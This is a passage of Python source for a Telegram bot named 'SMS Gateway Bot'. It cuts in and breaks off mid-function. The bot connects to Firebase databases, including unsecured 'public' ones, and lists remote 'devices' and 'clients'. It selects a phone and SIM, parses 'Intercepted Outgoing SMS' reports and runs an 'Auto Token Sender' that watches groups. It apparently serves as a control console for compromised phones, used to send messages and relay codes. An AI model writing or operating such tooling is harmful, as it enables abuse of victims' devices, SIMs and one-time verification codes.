        return to_num, msg

    to_num = msg = None
    for i, l in enumerate(lines):
        if l.startswith("📞") and "To:" in l:
            p = l.split("To:", 1)
            to_num = p[1].strip() if len(p) > 1 and p[1].strip() else None
        if l.startswith("💬") and "Message:" in l:
            p = l.split("Message:", 1)
            msg = p[1].strip() if len(p) > 1 and p[1].strip() else None
    if to_num and msg:
        return to_num, msg

    to_num = msg = None
    for i, l in enumerate(lines):
        if l.startswith("📱") and "Intercepted Outgoing SMS" in l:
            for j in range(i + 1, len(lines)):
                line = lines[j]
                if line.startswith("To (Tap to copy):"):
                    after = line.split(":", 1)[1].strip()
                    to_num = after or (lines[j + 1].strip() if j + 1 < len(lines) else None)
                elif line.startswith("Body (Tap to copy):"):
                    after = line.split(":", 1)[1].strip()
                    msg = after or (lines[j + 1].strip() if j + 1 < len(lines) else None)
                    break
            break
    if to_num and msg:
        return to_num, msg

    to_num = msg = None
    for i, l in enumerate(lines):
        if "To:" in l or l.startswith("📞"):
            p = l.split("To:", 1) if "To:" in l else None
            if p and len(p) > 1:
                to_num = p[1].strip()
        if "Message:" in l or l.startswith("💬"):
            p = l.split("Message:", 1) if "Message:" in l else None
            if p and len(p) > 1:
                msg = p[1].strip()
            elif i + 1 < len(lines):
                msg = lines[i + 1].strip()
    if to_num and msg:
        return to_num, msg

    return None, None

def extract_sims(device_data: dict) -> List[dict]:
    if not isinstance(device_data, dict):
        return [{"index": 0, "label": "📶 SIM 1"}, {"index": 1, "label": "📶 SIM 2"}]
    sims_raw = (
        device_data.get("sims")
        or device_data.get("simCards")
        or device_data.get("sim_cards")
        or device_data.get("simInfo")
    )
    if sims_raw and isinstance(sims_raw, list) and len(sims_raw) > 0:
        sims = []
        for i, s in enumerate(sims_raw):
            if not isinstance(s, dict):
                continue
            idx_val = (
                s.get("simSlotIndex")
                if s.get("simSlotIndex") is not None
                else (s.get("slot") or s.get("index") or s.get("simIndex") or i)
            )
            try:
                idx = int(idx_val)
            except Exception:
                idx = i
            label = f"📶 SIM {idx + 1}"
            carrier = s.get("carrierName") or s.get("carrier") or ""
            phone = s.get("phoneNumber") or s.get("number") or s.get("msisdn") or ""
            extra = []
            if carrier and str(carrier).lower() not in ("no service", "unknown"):
                extra.append(str(carrier))
            if phone:
                extra.append(str(phone))
            if extra:
                label += f" ({', '.join(extra)})"
            sims.append({"index": idx, "label": label})
        if sims:
            return sims
    return [{"index": 0, "label": "📶 SIM 1"}, {"index": 1, "label": "📶 SIM 2"}]

# ===================== KEYBOARDS =====================
def get_main_keyboard(user_cfg: dict):
    reply_label = "🔔 Start Reply" if not user_cfg.get("confirm_reply") else "🔔 Stop Reply"
    parse_label = "▶️ Start Auto Token Sender" if not user_cfg.get("parsing_enabled", True) else "⏸️ Stop Auto Token Sender"
    return ReplyKeyboardMarkup(
        [
            [KeyboardButton("📊 Status")],
            [KeyboardButton("📁 Manage Firebase")],
            [KeyboardButton("📱 Device"), KeyboardButton("📶 SIM")],
            [KeyboardButton("👥 Group")],
            [KeyboardButton(reply_label), KeyboardButton(parse_label)]
        ],
        resize_keyboard=True
    )

FIREBASE_SUB = ReplyKeyboardMarkup(
    [
        [KeyboardButton("🌐 Add Public Firebase"), KeyboardButton("🔒 Add Private Firebase")],
        [KeyboardButton("📋 Select Firebase"), KeyboardButton("🗑️ Delete Firebase")],
        [KeyboardButton("🔙 Back")]
    ],
    resize_keyboard=True
)

GROUP_SUB = ReplyKeyboardMarkup(
    [[KeyboardButton("➕ Add Group"), KeyboardButton("➖ Delete Group")],
     [KeyboardButton("📋 Select Group")],
     [KeyboardButton("🔙 Back")]],
    resize_keyboard=True
)

# ===================== ACCESS =====================
async def is_member(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    # No channel configured in settings → skip force-join
    if not CHANNEL_USERNAME:
        return True
    try:
        member = await context.bot.get_chat_member(CHANNEL_USERNAME, update.effective_user.id)
        return member.status not in ("left", "kicked")
    except Exception:
        return True

async def require_access(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user_id = update.effective_user.id
    if is_banned(user_id) and not is_admin(user_id):
        if update.message:
            await update.message.reply_text("🚫 You are banned.")
        elif update.callback_query:
            await update.callback_query.answer("You are banned.", show_alert=True)
        return False
    if CHANNEL_USERNAME and not await is_member(update, context):
        title = CHANNEL_TITLE or CHANNEL_USERNAME
        link = CHANNEL_LINK
        if not link:
            uname = CHANNEL_USERNAME.lstrip("@")
            link = f"https://t.me/{uname}" if uname else ""
        if link:
            msg = f"🚫 Join [{title}]({link}) first."
        else:
            msg = f"🚫 Join {title} first."
        if update.callback_query:
            await update.callback_query.answer("Join channel first!", show_alert=True)
        elif update.message:
            await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)
        return False
    return True

# ===================== STATUS =====================
def build_status_text(user_cfg: dict) -> str:
    fb_list = user_cfg.get("firebase_list", [])
    active_idx = user_cfg.get("active_firebase_index", 0)
    if 0 <= active_idx < len(fb_list):
        fb_item = fb_list[active_idx]
        url = fb_item.get("url") if isinstance(fb_item, dict) else str(fb_item)
        sec = fb_item.get("secret") if isinstance(fb_item, dict) else ""
        sa = fb_item.get("service_account") if isinstance(fb_item, dict) else None
        if sa:
            mode_tag = " (🔒 Private - Service Account)"
        elif sec:
            mode_tag = " (🔒 Private - Secret)"
        else:
            mode_tag = " (🌐 Public)"
        active_fb = f"{url}{mode_tag}"
    else:
        active_fb = "None"

    dev = user_cfg.get("device_id") or "Not set"
    sim_idx = user_cfg.get("sim_index", 0)
    sim_display = f"SIM {sim_idx + 1}" if dev != "Not set" else "Not set"
    groups = user_cfg.get("monitored_groups", [])

    msg = (
        f"📊 **Your Status**\n"
        f"🌐 Active Firebase: `{active_fb}`\n"
        f"   (Total: {len(fb_list)})\n"
        f"📱 Device: `{dev}`\n"
        f"📶 SIM: {sim_display}\n"
        f"👥 Groups: {len(groups)}\n"
    )
    for g in groups:
        title = g.get("title") or g["id"]
        msg += f"• `{title}` (`{g['id']}`)\n"
    msg += (
        f"🔔 Reply: {'ON' if user_cfg.get('confirm_reply') else 'OFF'}\n"
        f"🤖 Auto Token Sender: {'ON' if user_cfg.get('parsing_enabled', True) else 'OFF'}"
    )
    return msg

# ===================== ADMIN =====================
async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    t_users, t_fb, t_groups, active, banned = get_stats()
    text = (
        f"📈 **Statistics**\n\n"
        f"👥 Users: `{t_users}`\n"
        f"🌐 Firebases: `{t_fb}`\n"
        f"📢 Groups: `{t_groups}`\n"
        f"🤖 Active: `{active}`\n"
        f"🚫 Banned: `{banned}`"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("Usage: /broadcast message")
        return
    message = " ".join(context.args)
    with cache_lock:
        uids = list(user_cache.keys())
    status = await update.message.reply_text(f"Broadcasting to {len(uids)}...")
    ok = fail = 0
    for uid in uids:
        try:
            await context.bot.send_message(int(uid), message)
            ok += 1
        except Exception:
            fail += 1
        await asyncio.sleep(0.03)
    await status.edit_text(f"✅ Done\nSuccess: {ok}\nFailed: {fail}")

async def cmd_userinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("Usage: /userinfo <id>")
        return
    try:
        tid = int(context.args[0])
    except ValueError:
        await update.message.reply_text("Invalid ID")
        return
    cfg = get_user_config(tid)
    text = (
        f"👤 `{tid}`\n"
        f"Banned: `{is_banned(tid)}`\n"
        f"Firebases: `{len(cfg.get('firebase_list', []))}`\n"
        f"Device: `{cfg.get('device_id') or 'None'}`\n"
        f"Groups: `{len(cfg.get('monitored_groups', []))}`\n"
        f"Auto Sender: `{'ON' if cfg.get('parsing_enabled', True) else 'OFF'}`"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

async def cmd_deleteuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        return
    try:
        delete_user_data(int(context.args[0]))
        await update.message.reply_text(f"✅ Deleted `{context.args[0]}`")
    except Exception:
        await update.message.reply_text("Error")

async def cmd_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        return
    try:
        tid = int(context.args[0])
        if is_admin(tid):
            await update.message.reply_text("Cannot ban admin")
            return
        ban_user(tid)
        await update.message.reply_text(f"🚫 Banned `{tid}`")
    except Exception:
        pass

async def cmd_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        return
    try:
        unban_user(int(context.args[0]))
        await update.message.reply_text(f"✅ Unbanned `{context.args[0]}`")
    except Exception:
        pass

async def cmd_banned(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    banned = get_banned_users()
    if not banned:
        await update.message.reply_text("No banned users")
        return
    text = "🚫 Banned:\n" + "\n".join(f"`{u}`" for u in banned)
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

async def cmd_debuggroup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("Usage: /debuggroup <user_id>")
        return
    try:
        uid = str(int(context.args[0]))
    except ValueError:
        await update.message.reply_text("Invalid user id")
        return

    cfg = get_user_config(int(uid))
    groups = cfg.get("monitored_groups", [])

    text = f"👤 User `{uid}`\n\nStored groups:\n"
    for g in groups:
        text += f"• id=`{g['id']}`  title=`{g.get('title')}`\n"

    text += "\nCurrently in group_index:\n"
    with cache_lock:
        found = False
        for gid, users in group_index.items():
            if uid in users:
                text += f"• `{gid}`\n"
                found = True
        if not found:
            text += "• (none)\n"

    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

# ===================== CONVERSATION =====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await require_access(update, context):
        return ConversationHandler.END
    user_cfg = get_user_config(update.effective_user.id)
    await update.message.reply_text(
        "🔥 *SMS Gateway Bot*\nYour personal settings.",
        reply_markup=get_main_keyboard(user_cfg),
        parse_mode=ParseMode.MARKDOWN
    )
    return MAIN_MENU

async def prompt_device_selection(update: Update, context: ContextTypes.DEFAULT_TYPE, user_cfg: dict, msg_prefix: str = ""):
    """
    List ALL online devices (clients+devices, working.py logic + extras).
    Pages of 40 (Telegram inline button limit).
    """
    force_all = bool(context.user_data.get("force_show_all_devices"))
    online = get_online_devices(user_cfg)
    showing_online = True

    if force_all:
        showing_online = False
        devices = get_all_devices(user_cfg)
    elif online:
        devices = online
    else:
        showing_online = False
        devices = get_all_devices(user_cfg)

    if not devices:
        not_found_text = (
            f"{msg_prefix}\n\n" if msg_prefix else ""
        ) + (
            "📱 <i>No devices found in this Firebase (checked <code>devices</code> + "
            "<code>clients</code>). Open Firebase / check URL, or send Device ID as text.</i>"
        )
        if update.callback_query and update.callback_query.message:
            await update.callback_query.message.reply_text(
                not_found_text, parse_mode=ParseMode.HTML, reply_markup=get_main_keyboard(user_cfg)
            )
        elif update.message:
            await update.message.reply_text(
                not_found_text, parse_mode=ParseMode.HTML, reply_markup=get_main_keyboard(user_cfg)
            )
        return

    def sort_key(item):
        did, data = item
        if not isinstance(data, dict):
            return (0, 0.0, did)
        on = 1 if is_device_online(data) else 0
        ts = 0.0
        for key in ("lastOnlineAt", "last_seen", "lastSeen", "heartbeat"):
            val = data.get(key)
            if isinstance(val, dict):
                val = val.get("timestamp") or val.get("ts")
            ms = _to_ms_ts(val)
            if ms is not None:
                ts = max(ts, ms)
        return (on, ts, did)

    sorted_devs = sorted(devices.items(), key=sort_key, reverse=True)

    # pagination via context (page size 40 → under Telegram 100-btn limit with extras)
    page = int(context.user_data.get("device_page") or 0)
    page_size = 40
    total = len(sorted_devs)
    max_page = max(0, (total - 1) // page_size)
    if page > max_page:
        page = max_page
        context.user_data["device_page"] = page
    start = page * page_size
    chunk = sorted_devs[start:start + page_size]

    # store full list keys for page callbacks (ids only)
    context.user_data["device_list_mode"] = "online" if showing_online else "all"

    kb = []
    for did, data in chunk:
        model, phone, is_on = device_display_meta(data if isinstance(data, dict) else {})
        status_icon = "🟢" if is_on else "⚪"
        short = did if len(did) <= 12 else (did[:10] + "…")
        if model and phone:
            tail = phone[-4:] if len(phone) >= 4 else phone
            label = f"{status_icon} {model[:18]} ({tail}) · {short}"
        elif model:
            label = f"{status_icon} {model[:22]} · {short}"
        elif phone:
            label = f"{status_icon} {phone} · {short}"
        else:
            label = f"{status_icon} {did}"
        # Telegram button text max ~64 chars
        if len(label) > 60:
            label = label[:57] + "…"
        kb.append([InlineKeyboardButton(label, callback_data=f"device|{did}")])

    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"device_page|{page-1}"))
    if page < max_page:
        nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"device_page|{page+1}"))
    if nav:
        kb.append(nav)

    if showing_online and total > 0:
        kb.append([InlineKeyboardButton("📋 Show offline too", callback_data="device_show_all")])
    elif not showing_online:
        kb.append([InlineKeyboardButton("🟢 Online only", callback_data="device_show_online")])

    kb.append([InlineKeyboardButton("✏️ Enter Device ID manually", callback_data="device_manual")])
    kb.append([InlineKeyboardButton("🔙 Cancel", callback_data="device_cancel")])

    mode_txt = "online" if showing_online else "all"
    heading = (
        f"{msg_prefix}\n\n" if msg_prefix else ""
    ) + (
        f"📱 <b>Select Device</b> ({mode_txt}: <b>{total}</b>"
        f"{'' if total <= page_size else f', page {page+1}/{max_page+1}'})\n"
        f"<i>Showing {start+1}–{min(start+page_size, total)} · devices+clients merged</i>"
    )

    markup = InlineKeyboardMarkup(kb)
    if update.callback_query and update.callback_query.message:
        try:
            await update.callback_query.message.edit_text(
                heading, parse_mode=ParseMode.HTML, reply_markup=markup
            )
        except Exception:
            await update.callback_query.message.reply_text(
                heading, parse_mode=ParseMode.HTML, reply_markup=markup
            )
    elif update.message:
        await update.message.reply_text(
            heading, parse_mode=ParseMode.HTML, reply_markup=markup
        )

# ===================== MAIN MENU HANDLER =====================
async def main_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await require_access(update, context):
        return ConversationHandler.END

    user_id = update.effective_user.id
    user_cfg = get_user_config(user_id)
    text = (update.message.text or "").strip()

    # Manual device ID entry (after ✏️ button)
    if context.user_data.get("awaiting_device"):
        menu_buttons = {
            "📊 Status", "📁 Manage Firebase", "📱 Device", "📶 SIM", "👥 Group",
            "🔔 Start Reply", "🔔 Stop Reply",
            "▶️ Start Auto Token Sender", "⏸️ Stop Auto Token Sender",
            "➕ Add Firebase", "🌐 Add Public Firebase", "🔒 Add Private Firebase",
            "🗑️ Delete Firebase", "📋 Select Firebase",
            "➕ Add Group", "➖ Delete Group", "📋 Select Group", "🔙 Back",
        }
        if text not in menu_buttons and text:
            context.user_data.pop("awaiting_device", None)
            user_cfg["device_id"] = text
            save_user_config(user_id, user_cfg)
            data = get_device_data(user_cfg, text)
            sims = extract_sims(data) if data else []
            if len(sims) == 1:
                user_cfg["sim_index"] = sims[0]["index"]
                save_user_config(user_id, user_cfg)
            await update.message.reply_text(
                f"✅ Device <code>{html.escape(text)}</code> saved.",
                parse_mode=ParseMode.HTML,
                reply_markup=get_main_keyboard(user_cfg),
            )
            return MAIN_MENU
        context.user_data.pop("awaiting_device", None)

    if text == "📊 Status":
        await update.message.reply_text(build_status_text(user_cfg), parse_mode=ParseMode.MARKDOWN,
                                        reply_markup=get_main_keyboard(user_cfg))
        return MAIN_MENU

    if text == "📁 Manage Firebase":
        await update.message.reply_text("Firebase Management:", reply_markup=FIREBASE_SUB)
        return MAIN_MENU

    if text == "📱 Device":
        await prompt_device_selection(update, context, user_cfg)
        return MAIN_MENU

    if text == "📶 SIM":
        did = user_cfg.get("device_id")
        if not did:
            await update.message.reply_text("❌ Select a device first.", reply_markup=get_main_keyboard(user_cfg))
            return MAIN_MENU
        data = get_device_data(user_cfg, did)
        if not data:
            await update.message.reply_text("❌ Could not fetch device data (Firebase offline?).",
                                            reply_markup=get_main_keyboard(user_cfg))
            return MAIN_MENU
        sims = extract_sims(data)
        kb = [[InlineKeyboardButton(s["label"], callback_data=f"free_sim|{s['index']}")] for s in sims]
        kb.append([InlineKeyboardButton("✏️ Enter manually", callback_data="free_sim_manual")])
        kb.append([InlineKeyboardButton("🔙 Cancel", callback_data="free_sim_skip")])
        await update.message.reply_text("📶 Select SIM:", reply_markup=InlineKeyboardMarkup(kb))
        return MAIN_MENU

    if text == "👥 Group":
        await update.message.reply_text("Group Management:", reply_markup=GROUP_SUB)
        return MAIN_MENU

    if text in ("🔔 Start Reply", "🔔 Stop Reply"):
        user_cfg["confirm_reply"] = not user_cfg.get("confirm_reply", False)
        save_user_config(user_id, user_cfg)
        state = "ON" if user_cfg["confirm_reply"] else "OFF"
        await update.message.reply_text(f"Group reply is now {state}.", reply_markup=get_main_keyboard(user_cfg))
        return MAIN_MENU

    if text in ("▶️ Start Auto Token Sender", "⏸️ Stop Auto Token Sender"):
        user_cfg["parsing_enabled"] = not user_cfg.get("parsing_enabled", True)
        save_user_config(user_id, user_cfg)
        state = "ON" if user_cfg["parsing_enabled"] else "OFF"
        await update.message.reply_text(f"Auto Token Sender is now {state}.", reply_markup=get_main_keyboard(user_cfg))
        return MAIN_MENU

    if text == "🌐 Add Public Firebase":
        await update.message.reply_text(
            "🌐 <b>Send your Public Firebase URL:</b>\n\n"
            "Example: <code>https://myproject-default-rtdb.firebaseio.com</code>\n\n"
            "<i>(Press any menu button below to cancel)</i>",
            parse_mode=ParseMode.HTML
        )
        return ADD_PUBLIC_FIREBASE

    if text == "🔒 Add Private Firebase":
        await update.message.reply_text(
            "🔒 <b>Add Private Firebase:</b>\n\n"
            "Choose any one method:\n"
            "1️⃣ <b>File Upload:</b> Send your <code>.json</code> Service Account Private Key file directly\n"
            "2️⃣ <b>URL with Secret:</b> Send URL with auth param (e.g. <code>https://xyz.firebaseio.com?auth=SECRET</code>)\n"
            "3️⃣ <b>URL first:</b> Send URL, then bot will ask for Database Secret\n\n"
            "<i>(Press any menu button below to cancel)</i>",
            parse_mode=ParseMode.HTML
        )
        return ADD_PRIVATE_FIREBASE

    if text == "➕ Add Firebase":
        await update.message.reply_text(
            "📁 <b>Choose Firebase Type:</b>\n\n"
            "• <b>🌐 Add Public Firebase:</b> No secret or auth key required\n"
            "• <b>🔒 Add Private Firebase:</b> Service Account JSON or Database Secret",
            parse_mode=ParseMode.HTML,
            reply_markup=FIREBASE_SUB
        )
        return MAIN_MENU

    if text == "🗑️ Delete Firebase":
        lst = user_cfg.get("firebase_list", [])
        if not lst:
            await update.message.reply_text("No Firebase stored.", reply_markup=FIREBASE_SUB)
            return MAIN_MENU
        kb = []
        for i, fb in enumerate(lst):
            u = fb.get("url") if isinstance(fb, dict) else str(fb)
            s = fb.get("secret") if isinstance(fb, dict) else ""
            sa = fb.get("service_account") if isinstance(fb, dict) else None
            lock = "🔒 " if (s or sa) else "🌐 "
            kb.append([InlineKeyboardButton(f"❌ {lock}{u}", callback_data=f"del_fb|{i}")])
        kb.append([InlineKeyboardButton("🔙 Cancel", callback_data="del_fb_cancel")])
        await update.message.reply_text("Select to delete:", reply_markup=InlineKeyboardMarkup(kb))
        return MAIN_MENU

    if text == "📋 Select Firebase":
        lst = user_cfg.get("firebase_list", [])
        if not lst:
            await update.message.reply_text("No Firebase stored.", reply_markup=FIREBASE_SUB)
            return MAIN_MENU
        active = user_cfg.get("active_firebase_index", 0)
        kb = []
        for i, fb in enumerate(lst):
            u = fb.get("url") if isinstance(fb, dict) else str(fb)
            s = fb.get("secret") if isinstance(fb, dict) else ""
            sa = fb.get("service_account") if isinstance(fb, dict) else None
            lock = "🔒 " if (s or sa) else "🌐 "
            active_mark = " (active)" if i == active else ""
            kb.append([InlineKeyboardButton(f"🔹 {lock}{u}{active_mark}", callback_data=f"sel_fb|{i}")])
        kb.append([InlineKeyboardButton("🔙 Cancel", callback_data="sel_fb_cancel")])
        await update.message.reply_text("Select active:", reply_markup=InlineKeyboardMarkup(kb))
        return MAIN_MENU

    if text == "➕ Add Group":
        await update.message.reply_text(
            "📢 Forward a message from the group/channel\nor send @username / invite link.\n(or press any button to cancel)"
        )
        return ADD_GROUP

    if text == "➖ Delete Group":
        groups = user_cfg.get("monitored_groups", [])
        if not groups:
            await update.message.reply_text("No groups monitored.", reply_markup=GROUP_SUB)
            return MAIN_MENU
        kb = [[InlineKeyboardButton(f"❌ {g.get('title') or g['id']}", callback_data=f"remove_group|{g['id']}")]
              for g in groups]
        kb.append([InlineKeyboardButton("🔙 Cancel", callback_data="remove_cancel")])
        await update.message.reply_text("Select group to remove:", reply_markup=InlineKeyboardMarkup(kb))
        return MAIN_MENU

    if text == "📋 Select Group":
        groups = user_cfg.get("monitored_groups", [])
        if not groups:
            await update.message.reply_text("No groups monitored.", reply_markup=GROUP_SUB)
            return MAIN_MENU
        kb = [[InlineKeyboardButton(f"📌 {g.get('title') or g['id']}", callback_data=f"sel_group|{g['id']}")]
              for g in groups]
        kb.append([InlineKeyboardButton("🔙 Cancel", callback_data="sel_group_cancel")])
        await update.message.reply_text("Your groups:", reply_markup=InlineKeyboardMarkup(kb))
        return MAIN_MENU

    if text == "🔙 Back":
        await update.message.reply_text("Main menu:", reply_markup=get_main_keyboard(user_cfg))
        return MAIN_MENU

    await update.message.reply_text("Use the buttons below.", reply_markup=get_main_keyboard(user_cfg))
    return MAIN_MENU

async def add_public_firebase_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await require_access(update, context):
        return ConversationHandler.END

    msg = update.message
    text = (msg.text or "").strip() if msg else ""

    menu_buttons = {
        "📊 Status", "📁 Manage Firebase", "📱 Device", "📶 SIM", "👥 Group",
        "🔔 Start Reply", "🔔 Stop Reply",
        "▶️ Start Auto Token Sender", "⏸️ Stop Auto Token Sender",
        "➕ Add Firebase", "🌐 Add Public Firebase", "🔒 Add Private Firebase",
        "🗑️ Delete Firebase", "📋 Select Firebase",
        "➕ Add Group", "➖ Delete Group", "📋 Select Group",
        "🔙 Back"
    }
    if text in menu_buttons:
        return await main_menu_handler(update, context)

    user_id = update.effective_user.id
    user_cfg = get_user_config(user_id)

    if not validate_firebase_url(text):
        await msg.reply_text(
            "❌ Invalid URL. Must start with `https://`\n\n"
            "Example: `https://myproject-default-rtdb.firebaseio.com`\n\n"
            "Send a valid Firebase URL or press any button below to cancel.",
            parse_mode=ParseMode.MARKDOWN
        )
        return ADD_PUBLIC_FIREBASE

    clean_url, _ = parse_firebase_input(text)

    fb_entry = {"url": clean_url, "secret": "", "service_account": None, "added_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
    user_cfg.setdefault("firebase_list", []).append(fb_entry)
    user_cfg["active_firebase_index"] = len(user_cfg["firebase_list"]) - 1
    save_user_config(user_id, user_cfg)

    success_msg = (
        f"✅ <b>Public Firebase Added Successfully!</b>\n\n"
        f"🔗 URL: <code>{clean_url}</code>\n"
        f"🛡️ Mode: <b>🌐 Public</b>"
    )
    await prompt_device_selection(update, context, user_cfg, msg_prefix=success_msg)
    return MAIN_MENU

async def _save_private_firebase_and_prompt(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE,
    user_id: int,
    user_cfg: dict,
    *,
    url: str,
    secret: str = "",
    service_account: Optional[dict] = None,
    project_id: str = "",
    mode_label: str = "🔒 Private",
) -> int:
    """Validate auth, save entry, notify, prompt devices. Returns next conversation state."""
    base = normalize_firebase_base(url)
    sec = clean_database_secret(secret) if secret else ""
    sa = service_account if isinstance(service_account, dict) else None

    ok, reason = await asyncio.get_running_loop().run_in_executor(
        None,
        lambda: test_firebase_auth(base, secret=sec, service_account=sa),
    )
    msg = update.message
    if not ok:
        await msg.reply_text(
            f"❌ <b>Connect failed</b>\n\n"
            f"🔗 <code>{html.escape(base)}</code>\n"
            f"⚠️ {html.escape(reason)}\n\n"
            f"Dubara <b>Database Secret</b> bhejein, ya Service Account <code>.json</code> upload karein.\n"
            f"(URL session me save hai — sirf secret/JSON bhejna kaafi hai)",
            parse_mode=ParseMode.HTML,
        )
        # keep pending URL for retry
        context.user_data["pending_firebase_url"] = base
        return ADD_FIREBASE_SECRET

    fb_entry = {
        "url": base,
        "secret": sec if not sa else "",
        "service_account": sa,
        "added_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }
    user_cfg.setdefault("firebase_list", []).append(fb_entry)
    user_cfg["active_firebase_index"] = len(user_cfg["firebase_list"]) - 1
    save_user_config(user_id, user_cfg)
    context.user_data.pop("pending_firebase_url", None)

    proj_line = f"👤 Project: <code>{html.escape(project_id)}</code>\n" if project_id else ""
    success_msg = (
        f"✅ <b>Private Firebase Connected!</b>\n\n"
        f"{proj_line}"
        f"🔗 URL: <code>{html.escape(base)}</code>\n"
        f"🛡️ Mode: <b>{html.escape(mode_label)}</b>\n"
        f"<i>Live auth check passed</i>"
    )
    await prompt_device_selection(update, context, user_cfg, msg_prefix=success_msg)
    return MAIN_MENU


async def add_private_firebase_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await require_access(update, context):
        return ConversationHandler.END

    msg = update.message
    text = (msg.text or "").strip() if msg else ""

    menu_buttons = {
        "📊 Status", "📁 Manage Firebase", "📱 Device", "📶 SIM", "👥 Group",
        "🔔 Start Reply", "🔔 Stop Reply",
        "▶️ Start Auto Token Sender", "⏸️ Stop Auto Token Sender",
        "➕ Add Firebase", "🌐 Add Public Firebase", "🔒 Add Private Firebase",
        "🗑️ Delete Firebase", "📋 Select Firebase",
        "➕ Add Group", "➖ Delete Group", "📋 Select Group",
        "🔙 Back"
    }
    if text in menu_buttons:
        context.user_data.pop("pending_firebase_url", None)
        return await main_menu_handler(update, context)

    user_id = update.effective_user.id
    user_cfg = get_user_config(user_id)

    # 1. Service Account .json (file or raw JSON text)
    json_data, json_err = await extract_json_from_message(update, context)
    # only hard-fail JSON error if user clearly sent a document
    if json_err and msg and msg.document:
        await msg.reply_text(
            f"❌ {json_err}\n\n"
            "Valid Service Account <code>.json</code> upload karein, "
            "ya pehle Firebase URL bhejein phir Database Secret.",
            parse_mode=ParseMode.HTML,
        )
        return ADD_PRIVATE_FIREBASE

    if json_data:
        is_valid, project_id, default_url, sa_err = parse_service_account_dict(json_data)
        if not is_valid:
            await msg.reply_text(sa_err or "❌ Invalid Service Account JSON.", parse_mode=ParseMode.MARKDOWN)
            return ADD_PRIVATE_FIREBASE

        # if user already sent URL first, prefer that host (regional RTDB)
        pending = context.user_data.get("pending_firebase_url") or ""
        use_url = normalize_firebase_base(pending) if pending else default_url
        return await _save_private_firebase_and_prompt(
            update, context, user_id, user_cfg,
            url=use_url,
            service_account=json_data,
            project_id=project_id or "",
            mode_label="🔒 Private (Service Account Key)",
        )

    # 2. Text: URL (+ optional ?auth=SECRET) or bare secret while pending URL
    if not text:
        await msg.reply_text(
            "❌ Kuch bheja nahi.\n\n"
            "• Firebase URL (`https://…firebaseio.com`)\n"
            "• URL with secret (`?auth=SECRET`)\n"
            "• Ya Service Account `.json` file",
        )
        return ADD_PRIVATE_FIREBASE

    # If waiting for secret but user re-entered private flow with only secret text
    pending = context.user_data.get("pending_firebase_url")
    if pending and not validate_firebase_url(text) and not text.startswith("{"):
        # treat as secret for pending URL
        return await _save_private_firebase_and_prompt(
            update, context, user_id, user_cfg,
            url=pending,
            secret=text,
            mode_label="🔒 Private (Database Secret)",
        )

    if not validate_firebase_url(text):
        await msg.reply_text(
            "❌ Invalid input.\n\n"
            "• Valid URL starting with `https://`\n"
            "• Or upload `service-account.json`\n"
            "• Or press any menu button to cancel.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return ADD_PRIVATE_FIREBASE

    clean_url, secret = parse_firebase_input(text)
    secret = clean_database_secret(secret)

    # URL already includes secret
    if secret:
        return await _save_private_firebase_and_prompt(
            update, context, user_id, user_cfg,
            url=clean_url,
            secret=secret,
            mode_label="🔒 Private (Database Secret)",
        )

    # Ask for Database Secret next
    context.user_data["pending_firebase_url"] = clean_url
    back_kb = ReplyKeyboardMarkup(
        [[KeyboardButton("🔙 Back")]],
        resize_keyboard=True,
    )
    await msg.reply_text(
        f"🔐 <b>Private Firebase — Database Secret</b>\n\n"
        f"🔗 URL: <code>{html.escape(clean_url)}</code>\n\n"
        f"Ab is project ka <b>Database Secret</b> plain text me bhejein "
        f"<i>ya</i> Service Account <code>.json</code> file upload karein.\n\n"
        f"📍 Console: Project Settings (⚙️) ➔ Service accounts ➔ <b>Database secrets</b>\n"
        f"⚠️ Web API key (<code>AIza…</code>) mat bhejna — kaam nahi karega.",
        parse_mode=ParseMode.HTML,
        reply_markup=back_kb,
    )
    return ADD_FIREBASE_SECRET


async def add_firebase_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await require_access(update, context):
        return ConversationHandler.END

    msg = update.message
    text = (msg.text or "").strip() if msg else ""

    menu_buttons = {
        "📊 Status", "📁 Manage Firebase", "📱 Device", "📶 SIM", "👥 Group",
        "🔔 Start Reply", "🔔 Stop Reply",
        "▶️ Start Auto Token Sender", "⏸️ Stop Auto Token Sender",
        "➕ Add Firebase", "🌐 Add Public Firebase", "🔒 Add Private Firebase",
        "🗑️ Delete Firebase", "📋 Select Firebase",
        "➕ Add Group", "➖ Delete Group", "📋 Select Group",
        "🔙 Back"
    }
    if text in menu_buttons:
        return await main_menu_handler(update, context)

    # Route to private handler if JSON file or has auth
    json_data, _ = await extract_json_from_message(update, context)
